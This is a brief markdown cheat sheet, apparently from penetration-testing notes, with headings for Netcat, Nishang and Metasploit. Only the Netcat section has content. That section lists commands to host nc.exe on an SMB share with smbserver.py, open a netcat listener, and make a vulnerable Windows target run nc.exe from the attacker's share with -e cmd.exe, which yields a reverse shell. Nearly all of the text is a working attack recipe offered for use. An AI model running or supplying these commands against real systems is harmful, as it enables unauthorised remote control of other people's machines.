- [SMB and netcat](#Netcat)
- [Nishang](#Nishang)
- [Metasploit](#Metasploit)

# Netcat
- On your local machine run smb server
```
mkdir smb; cd smb; cp /usr/share/windows-resources/binaries/nc.exe .;cd ..
```
- Run SMB server and netcat listener
```
smbserver.py share smb

nc -lnvp <your port>
```
 On vulnerable app
 ```
 \\<your_local_ip>\share\nc.exe -e cmd.exe <your_local_ip> <your_local_port>
 ```
